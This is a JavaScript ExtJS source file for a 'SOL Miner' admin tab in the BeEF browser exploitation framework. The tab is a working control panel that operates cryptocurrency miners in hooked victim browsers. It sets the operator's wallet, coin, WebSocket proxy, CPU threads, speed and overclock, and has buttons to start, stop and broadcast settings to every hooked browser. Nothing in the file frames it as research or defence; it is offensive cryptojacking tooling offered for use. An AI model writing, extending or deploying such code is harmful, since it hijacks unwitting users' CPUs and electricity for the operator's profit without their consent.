// ── Solana Miner Control Tab ──────────────────────────────────────────────────
// Admin control panel for the BeEF browser-based web miner.
// Controls are persisted via /api/hookpages/miner (token auth).
// Hooked-browser miners poll /hookpages/miner-state every 30 s to auto-apply.

MinerTab = function() {

    var token = beefwui.get_rest_token();

    // ── helpers ────────────────────────────────────────────────────────────────
    var apiUrl  = function(path) { return '/api/hookpages/miner' + (path||'') + '?token=' + token; };
    var fmtHash = function(n) {
        if (n >= 1e6) return (n/1e6).toFixed(2) + ' MH';
        if (n >= 1e3) return (n/1e3).toFixed(2) + ' KH';
        return n + ' H';
    };

    // ── Stats bar ──────────────────────────────────────────────────────────────
    var statsPanel = new Ext.Panel({
        id: 'miner-stats-panel',
        region: 'north',
        height: 80,
        border: false,
        cls: 'miner-stats-bar',
        bodyStyle: 'background:#1a1a2e;padding:12px 24px;',
        html: buildStatsHtml({ running: false, online_miners: 0, total_hashes: 0, wallet: '...', coin: 'SOL', threads: 2, speed: 5, overclock: false, ws_proxy: '' })
    });

    function buildStatsHtml(cfg) {
        var statusColor  = cfg.running ? '#22c55e' : '#f87171';
        var statusLabel  = cfg.running ? '⛏ MINING' : '⏸ STOPPED';
        var minerCount   = cfg.online_miners || 0;
        var totalHash    = fmtHash(cfg.total_hashes || 0);
        return '<div style="display:flex;align-items:center;gap:40px;font-family:monospace;">' +
            '<div><div style="font-size:.75rem;color:#94a3b8;text-transform:uppercase;letter-spacing:1px">Status</div>' +
                '<div style="font-size:1.4rem;font-weight:700;color:' + statusColor + '">' + statusLabel + '</div></div>' +
            '<div><div style="font-size:.75rem;color:#94a3b8;text-transform:uppercase;letter-spacing:1px">Active Miners</div>' +
                '<div style="font-size:1.4rem;font-weight:700;color:#e2e8f0">' + minerCount + '</div></div>' +
            '<div><div style="font-size:.75rem;color:#94a3b8;text-transform:uppercase;letter-spacing:1px">Total Hashes</div>' +
                '<div style="font-size:1.4rem;font-weight:700;color:#e2e8f0">' + totalHash + '</div></div>' +
            '<div><div style="font-size:.75rem;color:#94a3b8;text-transform:uppercase;letter-spacing:1px">Coin</div>' +
                '<div style="font-size:1.4rem;font-weight:700;color:#f59e0b">' + (cfg.coin||'SOL') + '</div></div>' +
            '<div style="flex:1;text-align:right;font-size:.75rem;color:#475569">Wallet: ' + (cfg.wallet||'not set') + '</div>' +
        '</div>';
    }

    // ── Config form ────────────────────────────────────────────────────────────
    var walletField = new Ext.form.TextField({
        fieldLabel: 'Wallet Address',
        name: 'wallet',
        anchor: '100%',
        emptyText: 'Your Solana (or other) wallet address',
        style: 'font-family:monospace'
    });

    var coinStore = new Ext.data.ArrayStore({
        fields: ['value', 'text'],
        data: [['SOL','SOL – Solana'],['ETH','ETH – Ethereum'],['BTC','BTC – Bitcoin'],
               ['DOGE','DOGE – Dogecoin'],['XMR','XMR – Monero'],['LTC','LTC – Litecoin'],
               ['ADA','ADA – Cardano'],['MATIC','MATIC – Polygon']]
    });
    var coinField = new Ext.form.ComboBox({
        fieldLabel: 'Coin (via unmineable.com)',
        name: 'coin',
        store: coinStore,
        displayField: 'text',
        valueField: 'value',
        mode: 'local',
        triggerAction: 'all',
        editable: false,
        value: 'SOL',
        anchor: '60%'
    });

    var wsProxyField = new Ext.form.TextField({
        fieldLabel: 'WebSocket Proxy URL',
        name: 'ws_proxy',
        anchor: '100%',
        emptyText: 'wss://your-server.com/miner-ws',
        style: 'font-family:monospace'
    });

    var workerField = new Ext.form.TextField({
        fieldLabel: 'Worker Name',
        name: 'worker_name',
        value: 'beef_hook',
        anchor: '50%'
    });

    var threadsSlider = new Ext.Slider({
        fieldLabel: 'CPU Threads  (1 – 8)',
        name: 'threads',
        value: 2,
        minValue: 1,
        maxValue: 8,
        increment: 1,
        anchor: '80%',
        plugins: new Ext.slider.Tip({
            getText: function(thumb) { return '<b>' + thumb.value + ' thread' + (thumb.value > 1 ? 's' : '') + '</b>'; }
        })
    });

    var speedSlider = new Ext.Slider({
        fieldLabel: 'Mining Speed  (1 – 10)',
        name: 'speed',
        value: 5,
        minValue: 1,
        maxValue: 10,
        increment: 1,
        anchor: '80%',
        plugins: new Ext.slider.Tip({
            getText: function(thumb) {
                var labels = ['','Minimum','Very Low','Low','Below Avg','Average','Above Avg','High','Very High','Maximum','Turbo'];
                return '<b>' + thumb.value + ' – ' + (labels[thumb.value]||'') + '</b>';
            }
        })
    });

    var overclockCheck = new Ext.form.Checkbox({
        fieldLabel: 'Overclock Mode',
        name: 'overclock',
        boxLabel: 'Enable  <span style="color:#f59e0b">(doubles batch size, higher CPU usage)</span>',
        checked: false
    });

    var configForm = new Ext.FormPanel({
        id: 'miner-config-form',
        title: '⚙ Configuration',
        collapsible: true,
        animCollapse: false,
        labelWidth: 180,
        bodyStyle: 'padding:16px;background:#1e293b;',
        style: 'background:#0f172a;',
        defaults: { labelStyle: 'color:#94a3b8;font-size:11px', msgTarget: 'side' },
        items: [walletField, coinField, wsProxyField, workerField,
                { xtype: 'spacer', height: 10 }, threadsSlider, speedSlider, overclockCheck]
    });

    // ── Start / Stop / Broadcast buttons ──────────────────────────────────────
    var startBtn = new Ext.Button({
        text: '▶ Start All Miners',
        cls: 'miner-btn-start',
        style: 'background:#22c55e;color:#fff;font-weight:700;border:none;padding:8px 20px;border-radius:6px;',
        handler: function() { minerAction('start'); }
    });

    var stopBtn = new Ext.Button({
        text: '⏹ Stop All Miners',
        style: 'background:#f87171;color:#fff;font-weight:700;border:none;padding:8px 20px;border-radius:6px;margin-left:10px;',
        handler: function() { minerAction('stop'); }
    });

    var saveBtn = new Ext.Button({
        text: '💾 Save Config',
        style: 'background:#334155;color:#e2e8f0;font-weight:700;border:1px solid #475569;padding:8px 20px;border-radius:6px;margin-left:10px;',
        handler: saveConfig
    });

    var broadcastBtn = new Ext.Button({
        text: '📡 Push Settings to All Hooks',
        style: 'background:#1d4ed8;color:#fff;font-weight:700;border:none;padding:8px 20px;border-radius:6px;margin-left:10px;',
        handler: function() { minerAction('broadcast'); }
    });

    var actionsPanel = new Ext.Panel({
        border: false,
        bodyStyle: 'background:#0f172a;padding:16px 24px;display:flex;align-items:center;gap:8px;',
        html: '',
        items: [startBtn, stopBtn, saveBtn, broadcastBtn]
    });

    // ── Activity log ──────────────────────────────────────────────────────────
    var logStore = new Ext.data.ArrayStore({
        fields: ['time', 'event', 'detail']
    });
    var logGrid = new Ext.grid.GridPanel({
        id: 'miner-log-grid',
        title: '📋 Activity Log',
        collapsible: true,
        store: logStore,
        height: 180,
        columns: [
            { header: 'Time',   dataIndex: 'time',   width: 80  },
            { header: 'Event',  dataIndex: 'event',  width: 150 },
            { header: 'Detail', dataIndex: 'detail', flex: 1    }
        ],
        viewConfig: { forceFit: true, emptyText: 'No events yet.' },
        bodyStyle: 'background:#0f172a;',
        stripeRows: true
    });

    function addLog(event, detail) {
        var now = new Date();
        var t = ('0'+now.getHours()).slice(-2) + ':' + ('0'+now.getMinutes()).slice(-2) + ':' + ('0'+now.getSeconds()).slice(-2);
        logStore.insert(0, [new logStore.recordType({ time: t, event: event, detail: detail||'' })]);
        if (logStore.getCount() > 100) logStore.removeAt(100);
    }

    // ── Core functions ────────────────────────────────────────────────────────
    function collectFormValues() {
        return {
            wallet:      walletField.getValue(),
            coin:        coinField.getValue(),
            ws_proxy:    wsProxyField.getValue(),
            worker_name: workerField.getValue(),
            threads:     threadsSlider.getValue(),
            speed:       speedSlider.getValue(),
            overclock:   overclockCheck.getValue()
        };
    }

    function applyConfig(cfg) {
        if (!cfg) return;
        if (cfg.wallet)      walletField.setValue(cfg.wallet);
        if (cfg.coin)        coinField.setValue(cfg.coin);
        if (cfg.ws_proxy)    wsProxyField.setValue(cfg.ws_proxy);
        if (cfg.worker_name) workerField.setValue(cfg.worker_name);
        if (cfg.threads)     threadsSlider.setValue(cfg.threads);
        if (cfg.speed)       speedSlider.setValue(cfg.speed);
        overclockCheck.setValue(!!cfg.overclock);
    }

    function saveConfig() {
        var vals = collectFormValues();
        Ext.Ajax.request({
            url: apiUrl(),
            method: 'PUT',
            jsonData: vals,
            success: function(r) {
                var d = Ext.util.JSON.decode(r.responseText);
                addLog('Config Saved', 'Threads=' + vals.threads + ' Speed=' + vals.speed + ' Coin=' + vals.coin);
                refreshStats();
            },
            failure: function() { addLog('Error', 'Failed to save config'); }
        });
    }

    function minerAction(action) {
        Ext.Ajax.request({
            url: apiUrl('/' + action),
            method: 'POST',
            jsonData: collectFormValues(),
            success: function(r) {
                var d = Ext.util.JSON.decode(r.responseText);
                var msgs = { start: '▶ Mining started', stop: '⏹ Mining stopped', broadcast: '📡 Settings pushed to all hooks' };
                addLog(msgs[action] || action, d.message || '');
                refreshStats();
            },
            failure: function() { addLog('Error', 'Action "' + action + '" failed'); }
        });
    }

    function refreshStats() {
        Ext.Ajax.request({
            url: apiUrl(),
            method: 'GET',
            success: function(r) {
                try {
                    var d = Ext.util.JSON.decode(r.responseText);
                    statsPanel.body.update(buildStatsHtml(d));
                    applyConfig(d);
                } catch(e) {}
            }
        });
    }

    // ── Assemble ──────────────────────────────────────────────────────────────
    var centerPanel = new Ext.Panel({
        region: 'center',
        border: false,
        autoScroll: true,
        bodyStyle: 'background:#0f172a;padding:16px;',
        items: [actionsPanel, { xtype: 'spacer', height: 12 }, configForm, { xtype: 'spacer', height: 12 }, logGrid]
    });

    MinerTab.superclass.constructor.call(this, {
        id: 'miner-tab',
        title: '⛏ SOL Miner',
        layout: 'border',
        closable: false,
        border: false,
        bodyStyle: 'background:#0f172a;',
        items: [statsPanel, centerPanel],
        listeners: {
            afterrender: function() {
                refreshStats();
                // auto-refresh stats every 30 s
                Ext.TaskMgr.start({
                    run: refreshStats,
                    interval: 30000,
                    scope: this
                });
            }
        }
    });
};

Ext.extend(MinerTab, Ext.Panel, {});
